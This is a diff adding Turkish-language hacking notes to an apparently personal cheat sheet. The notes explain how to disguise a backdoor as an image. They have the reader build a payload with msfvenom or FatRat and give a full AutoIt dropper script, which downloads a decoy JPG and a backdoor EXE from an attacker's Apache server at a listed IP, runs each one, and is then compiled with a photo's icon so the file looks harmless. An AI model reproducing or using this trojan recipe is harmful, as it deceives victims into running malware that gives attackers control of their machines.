@@ -100,3 +100,40 @@ Bu bilgisayarlar genelde şu amaçla kullanılır:
 > sherlock omerapaydin
 
 ---
+
+**_ Görsel ve Backdoor Birleştirmek _**
+
+- jpeg to icon arat// fotonun icon hali gerekli. İndirilen dosyada icon görünür
+- msfvenom veya FatRat ile oluşturulan backdoor oluştur. Foto,icon ve .exe dosyasını al.
+
+\*\* Autoit download // EXE dosyaları oluşturabiliyor. pdf-jpg.. ile (windows a yüklenir sadece)
+
+\*\*MakeTrojan //bu kod exe dosyasıyla pdf-jpg.. birleştirir
+
+> #include <StaticConstants.au3>
+> #include <WindowsConstants.au3>
+
+Local $urls = "url1,url2"
+
+Local $urlsArray = StringSplit($urls, ",", 2 )
+
+For $url In $urlsArray
+	$sFile = _DownloadFile($url)
+shellExecute($sFile)
+
+Next
+
+Func \_DownloadFile($sURL)
+    Local $hDownload, $sFile
+    $sFile = StringRegExpReplace($sURL, "^.\*/", "")
+$sDirectory = @TempDir & $sFile
+    $hDownload = InetGet($sURL, $sDirectory, 17, 1)
+    InetClose($hDownload)
+Return $sDirectory
+EndFunc ;==>\_GetURLImage
+\*\*
+
+- bu kodu .txt yap
+- kaliyi apachi komutu ile servis yap
+- Üstteki url kısımlarına "http://192.168.64.8/backdoor/android.jpg" "http://192.168.64.8/backdoor/myhttps.exe"
+  -Autoit Compile Script to .exe aç ve .txt dosyasını icon u gir
